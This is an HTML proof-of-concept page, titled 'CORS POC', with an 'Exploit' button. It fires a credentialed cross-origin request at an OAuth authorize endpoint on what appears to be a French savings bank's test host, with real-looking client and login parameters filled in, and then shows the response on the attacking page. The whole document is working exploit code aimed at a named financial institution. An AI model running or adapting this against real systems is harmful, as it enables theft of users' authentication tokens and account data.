<!DOCTYPE html>
<html>
	<body>
		<h2>CORS POC </h2>
		<div id="demo">
			<button type="button" onclick="cors()">Exploit</button>
		</div>
		
		<script>
		function cors() {
			var xhttp = new XMLHttpRequest();
			xhttp.onreadystatechange = function () {
				if (this.status == 200 && this.readyState == 4) {
					//document.getElementById("demo").innerHTML = this.responseText;
					document.getElementById("demo").innerHTML = xhttp.responseURL;
				}
			};
			xhttp.open("GET", "https://www.as-ex-ath-hml-groupe.qpa.caisse-epargne.fr/api/oauth/v2/authorize?nonce=c9fb2068-3552-4ed2-9662-a3931fc6d812&response_type=id_token+token&login_hint=135806439&cdetab=11315&display=touch&claims=%7B%22userinfo%22%3A%7B%22cdetab%22%3A%22null%22%2C%22authMethod%22%3A%22null%22%2C%22authLevel%22%3A%22null%22%7D%2C%22id_token%22%3A%7B%22auth_time%22%3A%7B%22essential%22%3Atrue%7D%2C%22last_login%22%3A%22null%22%7D%7D&bpcesta=%7B%22cdetab%22%3A%2211315%22%2C%22csid%22%3A%2219afce75-18d7-4ab1-b8d7-925caf651de6%22%2C%22typ_app%22%3A%22rest%22%2C%22typ_srv%22%3A%22part%22%2C%22enseigne%22%3A%22ce%22%2C%22typ_sp%22%3A%22out-band%22%2C%22typ_act%22%3A%22sso%22%2C%22snid%22%3A%22123456%22%2C%22mode_auth%22%3A%221%22%2C%22phase%22%3A%22prefusion%22%7D&client_id=ef5d248f-5454-4fba-9fc2-23b4e3fa3ed0&client_secret=&redirect_uri=containerApp%3A%2F%2FBAPIStepUpSuccess", true);
			xhttp.withCredentials = true;
			xhttp.setRequestHeader('Content-type', 'Accept: application/hal+json,application/json');
			xhttp.send();
		}
		</script>
		
	</body>
</html>